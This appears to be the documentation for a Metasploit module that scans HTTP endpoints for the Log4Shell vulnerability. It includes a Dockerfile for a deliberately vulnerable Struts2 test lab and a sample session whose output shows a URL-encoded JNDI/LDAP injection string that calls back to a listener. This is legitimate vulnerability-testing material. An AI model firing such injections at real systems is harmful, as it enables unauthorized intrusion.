## Vulnerable Application
This module will scan an HTTP end point for the Log4Shell vulnerability by injecting a format message that will
trigger an LDAP connection to Metasploit. This module is a generic scanner and is only capable of identifying
instances that are vulnerable via one of the pre-determined HTTP request injection points. These points include
HTTP headers and the HTTP request path. Additinally URI paths for common, known-vulnerable applications are included
in the `data/exploits/CVE-2021-44228/http_uris.txt` data file.

This module has been successfully tested with:

* Apache Solr
* Apache Struts2
* Spring Boot
* VMWare VCenter

## Verification Steps

1. Setup a vulnerable Struts2 instance (see the steps below)
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/log4shell_scanner`
4. Set the `SRVHOST`, `RHOSTS`, `RPORT` and `TARGETURI` options
    * For Struts2, set `TARGETURI` to `/struts2-showcase/`
5. Do: `run`
6. The target should be identified as vulnerable

### Struts2 Setup

The following docker file can be used to setup a vulnerable Struts2 instance for testing.

```
#
# To build the image:
#   docker build . -t struts2:2.5.28
# To run the container:
#   docker run --name struts2 --rm -p 8080:8080 struts2:2.5.28
#

ARG version=2.5.28
FROM bitnami/tomcat:9.0
USER root
ENV TOMCAT_PASSWORD password

RUN apt-get update && \
	apt-get -y install unzip && \
	apt-get clean && \
	rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN curl https://dlcdn.apache.org/struts/2.5.28/struts-2.5.28-all.zip > struts-all.zip && \
	unzip struts-all.zip && \
	cp /struts-2.5.28/apps/struts2-showcase.war /bitnami/tomcat/webapps/
```

## Options

### HTTP_METHOD
The HTTP method to use.

### HEADERS_FILE
File containing headers to check, one per line. Lines starting with `#` will be treated as comments.

### URIS_FILE
File containing additional URIs to check, one per line. These values will be appended to the `TARGETURI` option. Lines 
starting with `#` will be treated as comments. Lines may also contain the string `${jndi:uri}` which will be used as the
injection point. This enables query parameters to be included in the request which are required for certain
applications.

### LDAP_TIMEOUT
Time in seconds to wait to receive LDAP connections.

## Scenarios

### Struts2

```
msf6 > use auxiliary/scanner/http/log4shell_scanner 
msf6 auxiliary(scanner/http/log4shell_scanner) > set RHOSTS 192.168.159.128
RHOSTS => 192.168.159.128
msf6 auxiliary(scanner/http/log4shell_scanner) > set SRVHOST 192.168.159.128
SRVHOST => 192.168.159.128
msf6 auxiliary(scanner/http/log4shell_scanner) > set RPORT 8080
RPORT => 8080
msf6 auxiliary(scanner/http/log4shell_scanner) > set TARGETURI /struts2-showcase/
TARGETURI => /struts2-showcase/
msf6 auxiliary(scanner/http/log4shell_scanner) > run

[*] Started service listener on 192.168.159.128:389 
[+] Log4Shell found via /struts2-showcase/%24%7bjndi%3aldap%3a%24%7b%3a%3a-/%7d/192.168.159.128%3a389/r7yol50kgg7be/%24%7bsys%3ajava.vendor%7d_%24%7bsys%3ajava.version%7d%7d/ (java: BellSoft_11.0.13)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/log4shell_scanner) > 

```
